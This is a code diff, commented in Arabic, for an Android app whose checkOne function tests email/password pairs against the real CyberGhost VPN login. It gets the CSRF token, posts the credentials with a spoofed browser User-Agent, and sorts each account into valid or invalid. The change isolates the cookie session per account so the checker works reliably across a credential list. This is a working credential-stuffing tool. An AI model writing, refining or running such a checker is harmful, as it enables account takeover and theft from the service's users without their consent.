@@ -17,13 +17,23 @@ import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
 import okhttp3.*
-import okhttp3.MediaType.Companion.toMediaType
-import okhttp3.RequestBody.Companion.toRequestBody
 import java.io.File
 import java.util.concurrent.TimeUnit
 
 class MainActivity : AppCompatActivity() {
+    // إدارة الكوكيز عشان نحاكي الـ Session في بايثون
+    private val cookieStore = mutableMapOf<String, MutableList<Cookie>>()
+    private val cookieJar = object : CookieJar {
+        override fun saveFromResponse(url: HttpUrl, cookies: List<Cookie>) {
+            cookieStore[url.host] = cookies.toMutableList()
+        }
+        override fun loadForRequest(url: HttpUrl): List<Cookie> {
+            return cookieStore[url.host] ?: emptyList()
+        }
+    }
+
     private val client = OkHttpClient.Builder()
+        .cookieJar(cookieJar)
         .connectTimeout(20, TimeUnit.SECONDS)
         .readTimeout(20, TimeUnit.SECONDS)
         .followRedirects(true)
@@ -93,27 +103,22 @@ class MainActivity : AppCompatActivity() {
     private suspend fun checkOne(email: String, pwd: String): Pair<String, String> =
         withContext(Dispatchers.IO) {
             try {
-                // 1. جلب CSRF Token
+                // 1. ننضف الكوكيز القديمة عشان كل حساب يبقى ليه جلسة مستقلة
+                cookieStore.clear()
+
+                // 2. جلب صفحة الدخول
                 val getReq = Request.Builder()
                     .url("https://my.cyberghostvpn.com/en_US/login")
                     .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
                     .build()
                 
-                val getResp = client.newCall(getReq).execute()
-                val cookies = getResp.headers("Set-Cookie")
-                getResp.close()
+                client.newCall(getReq).execute().close()
 
-                var csrf = ""
-                for (c in cookies) {
-                    if (c.contains("csrfToken=")) {
-                        csrf = c.substringAfter("csrfToken=").substringBefore(";")
-                        break
-                    }
-                }
-
+                // 3. استخراج الـ CSRF من الكوكيز المخزنة
+                val csrf = cookieStore["my.cyberghostvpn.com"]?.find { it.name == "csrfToken" }?.value ?: ""
                 if (csrf.isEmpty()) return@withContext "error" to "no_csrf"
 
-                // 2. إرسال بيانات الدخول
+                // 4. إرسال البيانات
                 val formBody = FormBody.Builder()
                     .add("email", email)
                     .add("password", pwd)
@@ -123,18 +128,17 @@ class MainActivity : AppCompatActivity() {
                 val postReq = Request.Builder()
                     .url("https://my.cyberghostvpn.com/login")
                     .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
-                    .header("Content-Type", "application/x-www-form-urlencoded")
                     .header("Origin", "https://my.cyberghostvpn.com")
                     .header("Referer", "https://my.cyberghostvpn.com/en_US/login")
-                    .header("Cookie", "csrfToken=$csrf")
                     .post(formBody)
                     .build()
 
                 client.newCall(postReq).execute().use { r ->
                     val body = r.body?.string()?.lowercase() ?: ""
                     val newCookies = r.headers("Set-Cookie").toString().lowercase()
+                    val sessionCookies = cookieStore["my.cyberghostvpn.com"]?.map { it.name }?.joinToString(",") ?: ""
                     
-                    if (newCookies.contains("login_web_") || newCookies.contains("remember_web_") || body.contains("logout") || body.contains("sign out") || body.contains("dashboard")) {
+                    if (sessionCookies.contains("login_web_") || sessionCookies.contains("remember_web_") || body.contains("logout") || body.contains("sign out") || body.contains("dashboard")) {
                         "valid" to "ok"
                     } else if (body.contains("invalid") || body.contains("credentials") || body.contains("password")) {
                         "invalid" to "wrong_pass"
